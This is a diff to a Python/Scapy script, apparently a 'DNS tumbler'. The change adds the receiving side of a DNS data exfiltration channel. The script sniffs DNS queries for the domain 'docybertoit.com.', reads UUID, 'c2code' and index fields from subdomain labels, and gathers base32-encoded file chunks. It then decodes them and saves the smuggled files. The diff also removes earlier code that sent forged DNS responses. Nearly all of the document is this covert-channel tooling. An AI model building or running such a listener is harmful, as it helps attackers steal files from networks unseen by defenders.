@@ -5,8 +5,11 @@ import random
 import string
 import sys, argparse
 import time
-apexdomain = 'docybertoit.com'
+import base64
+apexdomain = 'docybertoit.com.'
 file_uuids = []
+file_chunks = {}
+num_chunks = 0
 
 def get_random_string(length):
     letters = string.ascii_lowercase
@@ -18,12 +21,13 @@ def get_random_ip_address():
     return '.'.join(x for x in randIP)
 
 def dns_responder(pkt: IP):
-    global apexdomain
     
     
     queryname = pkt["DNS Question Record"].qname #byte class
-    query = queryname.decode('utf-8')
-    if apexdomain.com in query:
+    query = queryname.decode('utf-8').strip()
+    
+    # print(query[-16:])
+    if apexdomain in query[-16:]:
         """
         #this query is destined for this listener, need to extra the UUID to
         determine if the file is already in transit or a new file, then start receiving the data
@@ -37,36 +41,62 @@ def dns_responder(pkt: IP):
         2. send file_chunk_query, coded with D, each file chunk identified by its index
         3. send finish_query query with Z, denoting complete
 
+        setup_query = UUID.CODE.NUMCHUNKS.TOPLEVELDOMAIN.com
+        data_query = UUID.CODE.index.file_data.TOPLEVELDOMAIN.com
+        finish_query = UUID.code.final_index.topleveldomain.com
         """
+        info = (query.split('.'))
+        #info[0] = uuid
+        #info[1] = c2code
+        #info[2] = index
+        uuid = info[0]
+
+        if uuid not in file_chunks.keys():
+            file_chunks[uuid] = []
+
+        c2code = info[1]
+
+        index = int(info[2])
+
+        if c2code == 'A':
+            global num_chunks
+            num_chunks = index
+            print("Num chunks = ", num_chunks)
+            print("start of file, num_chunks = ", num_chunks)
+            file_chunks[uuid] =  [None] * num_chunks    #create the list with the total index length
+            print("The length of the file_chunks list is: ", len(file_chunks[uuid]))
+
+        if c2code == 'D':
+            #print("UUID: ", uuid)
+            #print("INDEX: " , index)
+            #print("INFO: " , info[3])
+            file_chunks[uuid][index] = info[3]
+            #print(file_chunks[uuid][index])
+        
+        if c2code == 'Z':
+            print('end of file')
+            #print(file_chunks[uuid])
+            save_base32_file(uuid, file_chunks[uuid])
+
+
         
     return
-    if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
-        if apexdomain in str(queryname) and (pkt["DNS Question Record"].qtype == 1): #A Record (AAAA Record == 28)
-            
-            #A DNS response for an A record should come back
-            # 1. The original Question
-            # 2. An RR count
-            # 3. The A record answers
 
-            #here's another test packet -> DNS response with a CNAME, sends back a CNAME -> redirct with bogus data
-            
-            aliasanswer = bytes(get_random_string(48) + '.' + apexdomain, 'utf-8')            
-            dnsARecordAnswer = DNSRR(rrname=aliasanswer, type=1, rclass=1, rdlen=None, rdata=get_random_ip_address()) 
-            dnsCNameAnswer = DNSRR(rrname=queryname, type=5, rclass=1, ttl=60, rdlen=None, rdata=aliasanswer)
-            dnsOriginalQuery = DNSQR(qname=queryname, qtype=1, qclass=1)
+def save_base32_file(file_name, file_data):
+    #saves a file with name file_name, going over a list of data chunks that are base32 encoded, 
+    # converts them back to byte data, and saves the file
+    f = open(f"receive/{file_name}", 'wb')
+    for data in file_data:
+        #first, convert from b32 back to data string
+        #then, conver str to byte data
+        #then, write to file
+        b32_decode_str = base64.b32decode(data)
+        print(b32_decode_str)
+        #b#yte_data = str.encode(b32_decode_str)
+        #p#rint(byte_data)
+        f.write(b32_decode_str)
+    f.close()
 
-            l5 = DNS(length=None, id=pkt[DNS].id, qr=1, opcode=0, aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=2, nscount=0, arcount=0, qd=dnsOriginalQuery,
-                an=dnsCNameAnswer/dnsARecordAnswer, ns=None, ar=None)
-            l4 = UDP(dport=pkt[UDP].sport, sport=53)
-            l3 = IP(dst=pkt[IP].src, src=pkt[IP].dst)
-            response_packet: IP
-            response_packet = l3/l4/l5
-            send(response_packet)
-            print("Responding with: ", response_packet.summary())
-        else:
-            pass #not the right dns query
-            
-    return None
                     
 
 def start_sniffer(bpf_filter, listen_int):
@@ -89,7 +119,7 @@ def main(args):
         listen_int = args['interface']
         #local_ip = args['dns']
         dns_server_ip = args['dns']
-        apexdomain = args['apexdomain']
+
         
         #bpf_filter =  f"udp port 53 and ip dst {args['dns']}"
         bpf_filter =  "udp port 53"
@@ -105,7 +135,6 @@ if __name__ == "__main__":
         or send queries to a DNS server', action='store_true')
     ap.add_argument("-d", "--dns", type=str, help='The upstream DNS Server address \
         if this is a sending DNS tumbler. Otherwise, omit.')
-    ap.add_argument("-a", "--apexdomain", type=str, help='The Apex domain')
     ap.add_argument("-i", "--interface", type=str, default='',
         help='If this is a responding dns tumbler, define the interface \
         to listen on. Otherwise omit')
